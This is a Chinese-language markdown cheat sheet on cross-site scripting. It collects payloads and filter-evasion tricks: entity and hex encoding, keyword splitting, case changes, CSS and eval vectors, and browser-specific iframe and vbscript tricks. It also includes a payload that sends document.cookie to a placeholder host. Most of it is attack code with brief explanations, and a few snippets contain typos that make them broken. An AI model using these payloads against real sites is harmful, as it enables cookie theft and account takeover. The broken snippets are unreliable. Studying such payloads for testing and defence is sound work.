---
title: "XSS"
date: 2016-01-20 21:38
---

## xss cheat sheet

xss cheat sheet 即测试xss的测试样表

[XSS_Filter_Evasion_Cheat_Sheet][2]

[XSS Filter Evasion Cheat Sheet 中文版][3]

[HTML5 Security Cheatsheet][1]


```
<script>alert(1);</script>
<script>alert('xss');</script>
<iframe onload="alert(1)"></iframe>
```

## xss payload 收集

### svg

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```


## xss 过滤绕过

* <>

```
<scirpt>alert(1);</script>
```

对 <> 或 < script > 进行过滤或转义，可以防御此类xss

* HTML标签属性执行XSS

很多HTML标签属性支持 javascipt:[code] 伪协议的形式。这个协议类型声明了URL的主体是任意的JavaScript代码，由javascript的解释器运行

```
<table background="javascript:alert(/xss/)"></table>
<img src="javascript:alert('xss');">
```

> 并不是所有的浏览器都支持javascript伪协议

并不是所有的标记的属性都可以产生XSS，通常只有引用文件的属性才能触发XSS。

```
href=
lowsrc=
bgsound=
background=
value=
action=
dynsrc=
```

* 空格 换行 Tab

```
<img src="javas cript:alert(/xss/)" width=100>
```

> javas 和 cript是Tab

关键字拆分绕过过滤限制，使用Tab, 空格， 换行。原因分析如下：

javascript语句通常以分号结尾，如果一个语句是完整的，而这一行的结尾是换行符，就可以省略分号。如果同一行中有过个语句，则每个语句就必须使用分号来结束(最后一条语句可以不用分号)

```
var a = true
var b = "something";
```

除了在引号中分隔单词或强制结束语句外，额外的空白无论以何种方式添加都无所谓。

```
<img src="javas
cript:
alert(/xss/)">
```

换行处不是一个完整语句时，js会继续处理发现的内容，直到遇到一个分号或发现完整的语句为止

* 标签属性值转码

原理： HTML属性中，会自动对实体字符进行转义

编码绕过，HTML标记的属性值过滤，HTML **属性** 本身支持ASCII码形式, 转码支持十进制和十六进制。

可以在十进制（十六进制）字符后面加 **;** , 还可以在前面加 0 , 如

```
&#0
&#00
&#000
&#0000
```

```
<img src="a" onerror="aler&#116(/xss/)">
<img src=1 onerror="aler&#116;(/xss/)">
<img src="a" onerror="&#97&#108&#101&#114&#116&#40&#47&#120&#115&#115&#47&#41">
<img src="a" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#47;&#120;&#115;&#115;&#47;&#41;">
<img src="a" onerror="&#x61&#x6c&#x65&#x72&#x74&#x28&#x2f&#x78&#x73&#x73&#x2f&#x29">
<img src="a" onerror="&#000097&#000108&#000101&#000114&#000116&#000040&#000047&#000120&#000115&#000115&#000047&#000041">
<img src="a" onerror="&#97&#108&#101&#114&#116&#32&#40&#47&#120&#115&#115&#47&#41">
```

注：

```
Tab(&#9), 换行符(&#10), 空格(&#32)可以被插入到代码中任意地方。
```

**防御：**

```
&过滤为 &amp;
```

* 产生自己的事件

当不能依靠属性进行跨站时，可以使用事件。js和HTML之间的交互是通过事件来实现的，事件就是用户或浏览器自身执行的某种动作，如click, load等，而响应事件的函数叫做事件处理函数（或事件侦听器）。

W3C将事件分为3个不同的类别：

```
用户接口(鼠标，键盘)
逻辑（处理的结果）
变化（对文档进行修改）
```

测试事件型xss:

```
onResume
onReverse
onRowDelete
onRowInserted
onSeek
onSynchRestored
onTimeError
onTrackChange
onURLFlip
onRepeat
onMediaComplete
onMediaError
onPause
onProgress
onOutOfSync
onlayoutcomplete
onafterprint
onbeforeprint
ondataavailable
ondatasetchanged
ondatasetcomplete
onerrorupdate
onrowenter
onrowexit
onrowsdelete
onrowsinserted
onselectionchange
onbounce
onfinish
onstop
onresizeend
```

* CSS 跨站剖析

xss另一个载体是CSS样式表，使用CSS样式表执行js具有隐蔽，灵活多变等特点，但其有个很大的缺点：各浏览器之间不能通用，甚者可能同一浏览器不同版本之间都不能通用

```
<div style="background-img:url(javascript:alert('xss'))">
<style>
    body {background-image: url{"javascript:alert('xss')"};}
</style>
```

* eval

```
<script>
eval("alert('xss')");
</script>

# eval 执行十六进制字符串形式
<script>
eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29");
</script>

# eval 执行10进制形式，需要 String.fromCharCode() 配合使用
```

## 0x03 常见绕过

```
# 大小写转换
<IMG sRc="a" onerror="alert(/xss/)">
# 单引号
<img src="a" onerror='alert(/xss/)'>
# 不用引号
<img src="a" onerror=alert(/xss/)>
# / 隔开
<img/src="a"/onerror="alert(/xss/)">
# /**/
<img/**/src="a"/**/onerror=alert(/xss/)>
```

## 0x04 常用 xss payload

```
# <svg>
<svg><script>location.href="http://ip/xss.php?q="+document.cookie</script></svg>
```

## 0x05 浏览器特性

### chrome

* Chrome下data协议执行代码

```
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
```

* Chrome下srcdoc属性

```
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
```

### IE

* IE下vbscript执行代码

```
<iframe src="vbscript:msgbox(1)"></iframe>
```

## 0x06 flash

[swf反编译软件下载][4]

## 0x 参考

* [ 乌云 Flash Xss入门--navigateToURL][5]

* [ 乌云 Flash Xss进阶--ExternalInterface.call(1)][6]

* [ 乌云 Flash Xss进阶--ExternalInterface.call(2)][7]

* [ 乌云 Flash Xss进阶--addCallback][8]

[1]: http://html5sec.org/
[2]: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
[3]: http://drops.wooyun.org/tips/1955
[4]: https://www.free-decompiler.com/flash/download/
[5]: http://www.wooyun.org/bugs/wooyun-2010-016512
[6]: http://www.wooyun.org/bugs/wooyun-2010-016532
[7]: http://www.wooyun.org/bugs/wooyun-2010-016598
[8]: http://www.wooyun.org/bugs/wooyun-2010-016803
